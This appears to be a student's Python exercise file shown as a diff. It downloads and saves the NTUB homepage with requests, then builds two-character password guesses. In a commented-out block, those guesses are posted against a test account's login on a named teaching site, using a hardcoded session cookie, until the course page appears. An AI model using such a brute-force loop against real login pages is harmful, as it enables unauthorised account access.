@@ -1,0 +1,82 @@
+import requests
+import codecs
+
+x=requests.get(
+	"https://www.ntub.edu.tw/",
+	headers={
+	"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
+	},
+	params={},#網址參數資料
+	data={}, #傳遞的資料
+	json={}
+)
+print(x.status_code) #讀取狀態
+print(x.headers) #標頭資訊
+x.encoding="utf8"
+print(x.encoding) #顯示編碼
+
+print("----------------------")
+
+# for k,v in x.headers.items():
+# 	print(k,"=",v)
+with codecs.open("2020-11-18.html","w",encoding="utf8") as f:
+	f.write(x.text)
+
+
+# x=requests.get(
+# 	"https://www.ntub.edu.tw/var/file/0/1000/randimg/mobileadv_5399_245808_09577.jpg",
+# 	headers={
+# 	"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
+# 	},
+# 	params={},
+# 	data={}, #傳遞的資料
+# 	json={}
+#)
+#print(x.url) #顯示網址
+# with codecs.open("2020-11-18.jpg","wb") as f:
+# 	f.write(x.content)
+
+plist=["a","b","c","d","e","1","2","3","4","5","6","7","8","9","0"]
+password=[]
+def crack(a=2,v=""):
+	global password
+	for d in plist:
+		password+=[v+d]
+		print(password)
+		if a>1:
+			crack(a-1,v+d)
+crack(2,"")
+
+# for p in password:
+# 	x=requests.post(
+# 		"http://teaching.bo-yuan.net/",
+# 		headers={
+# 		"Cookie":"PHPSESSID=k40t8is0f6i2lk9hpamo1brk54",
+# 		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
+# 		},
+# 		params={
+# 			"uid":"5fb4d5601e889"
+# 		},
+# 		data={
+# 			"ex[class]":"5f9d7897cfa59",
+# 			"ex[username]":"99測試",
+# 			"ex[password]":p
+# 		} #傳遞的資料
+# 	)
+# 	x2=requests.get(
+# 		"http://teaching.bo-yuan.net/",
+# 		headers={
+# 		"Cookie":"PHPSESSID=k40t8is0f6i2lk9hpamo1brk54",
+# 		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
+# 		}
+# 	)
+# 	x2.encoding="utf8"
+# 	if "課程內容" in x2.text:
+# 		print("密碼是:",p)
+# 		break
+
+
+
+# x.encoding="utf8"
+# with codecs.open("2020-11-18.html","w",encoding="utf8") as f:
+# 	f.write(x.text)
